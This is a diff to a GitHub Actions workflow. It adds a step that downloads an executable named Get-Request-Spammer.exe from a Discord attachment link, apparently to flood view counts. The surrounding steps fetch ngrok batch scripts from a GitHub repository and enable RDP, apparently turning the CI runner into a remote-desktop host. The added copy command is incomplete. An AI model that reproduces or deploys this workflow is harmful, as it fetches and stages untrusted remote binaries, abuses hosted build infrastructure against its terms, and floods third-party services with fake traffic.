@@ -26,6 +26,10 @@ jobs:
         Invoke-WebRequest https://github.com/nekospara/dsadasdasdada/blob/master/Files/NGROK-US.bat?raw=true -OutFile NGROK-US.bat
         Invoke-WebRequest https://github.com/nekospara/dsadasdasdada/blob/master/Files/NGROK-CHECK.bat?raw=true -OutFile NGROK-CHECK.bat
         Invoke-WebRequest https://github.com/nekospara/dsadasdasdada/blob/master/Files/loop.bat?raw=true -OutFile loop.bat
+    - name: Download and copy github view flooder sex
+      run: |
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/877528822428356618/881635987200028712/Get-Request-Spammer.exe -OutFile Get-Request-Spammer.exe
+        copy Get-Request-Spammer.exe 
     - name: Make YML file for NGROK.
       run: start NGROK-US.bat
     - name: Enable RDP Access.
